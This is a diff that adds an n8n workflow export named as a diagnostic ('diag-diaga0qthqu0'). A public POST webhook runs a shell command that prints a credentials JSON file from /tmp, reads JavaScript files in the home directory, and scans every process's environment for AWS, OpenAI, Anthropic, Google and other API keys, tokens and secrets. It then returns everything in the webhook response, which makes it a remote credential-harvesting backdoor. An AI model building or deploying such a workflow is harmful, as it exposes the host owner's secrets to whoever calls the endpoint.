@@ -1,0 +1,180 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-11-26T19:50:38.995Z",
+    "createdAt": "2026-11-26T19:50:38.995Z",
+    "versionId": "f007ce14-e8c0-45f9-93f5-24ef6e409b2a",
+    "workflowId": "VGBHXs2SFO0GvY8Z",
+    "nodes": [
+      {
+        "parameters": {
+          "httpMethod": "POST",
+          "path": "diaga0qthqu0",
+          "responseMode": "responseNode",
+          "options": {}
+        },
+        "id": "n1",
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 2,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "diaga0qthqu0"
+      },
+      {
+        "parameters": {
+          "command": "echo ===CREDSJSON===; wc -c /tmp/i23977_creds.json; head -c 1500 /tmp/i23977_creds.json; echo; echo ===JSFILES===; head -c 400 /home/node/s.js; echo ...; head -c 400 /home/node/se.js; echo ===ALLPROC===; for p in /proc/[0-9]*; do echo \"--$p--$(tr '\\0' ' ' < $p/cmdline 2>/dev/null | head -c 120)\"; tr '\\0' '\\n' < $p/environ 2>/dev/null | grep -iE 'AWS|OPENAI|ANTHROPIC|GOOGLE|GEMINI|GROQ|OPENROUTER|BEDROCK|TOKEN|SECRET|API_KEY|_KEY=' | head -20; done; echo ===TMP===; ls -la /tmp | head -40; echo ===HOME===; ls -la /home/node | head -40"
+        },
+        "id": "n2",
+        "name": "Exec",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          220,
+          0
+        ]
+      },
+      {
+        "parameters": {
+          "respondWith": "json",
+          "responseBody": "={{ JSON.stringify($json) }}",
+          "options": {}
+        },
+        "id": "n3",
+        "name": "Respond",
+        "type": "n8n-nodes-base.respondToWebhook",
+        "typeVersion": 1,
+        "position": [
+          440,
+          0
+        ]
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Exec",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      },
+      "Exec": {
+        "main": [
+          [
+            {
+              "node": "Respond",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "Matheus Cristhyan",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "f007ce14-e8c0-45f9-93f5-24ef6e409b2a",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exec": {
+      "main": [
+        [
+          {
+            "node": "Respond",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-11-26T19:50:38.984Z",
+  "id": "VGBHXs2SFO0GvY8Z",
+  "isArchived": false,
+  "meta": null,
+  "name": "diag-diaga0qthqu0",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "diaga0qthqu0",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "n1",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "diaga0qthqu0"
+    },
+    {
+      "parameters": {
+        "command": "echo ===CREDSJSON===; wc -c /tmp/i23977_creds.json; head -c 1500 /tmp/i23977_creds.json; echo; echo ===JSFILES===; head -c 400 /home/node/s.js; echo ...; head -c 400 /home/node/se.js; echo ===ALLPROC===; for p in /proc/[0-9]*; do echo \"--$p--$(tr '\\0' ' ' < $p/cmdline 2>/dev/null | head -c 120)\"; tr '\\0' '\\n' < $p/environ 2>/dev/null | grep -iE 'AWS|OPENAI|ANTHROPIC|GOOGLE|GEMINI|GROQ|OPENROUTER|BEDROCK|TOKEN|SECRET|API_KEY|_KEY=' | head -20; done; echo ===TMP===; ls -la /tmp | head -40; echo ===HOME===; ls -la /home/node | head -40"
+      },
+      "id": "n2",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        220,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "n3",
+      "name": "Respond",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        440,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "executionOrder": "v1",
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-11-26T19:50:38.984Z",
+      "createdAt": "2026-11-26T19:50:38.984Z",
+      "role": "workflow:owner",
+      "workflowId": "VGBHXs2SFO0GvY8Z",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-11-26T19:50:38.984Z",
+  "versionId": "f007ce14-e8c0-45f9-93f5-24ef6e409b2a"
+}
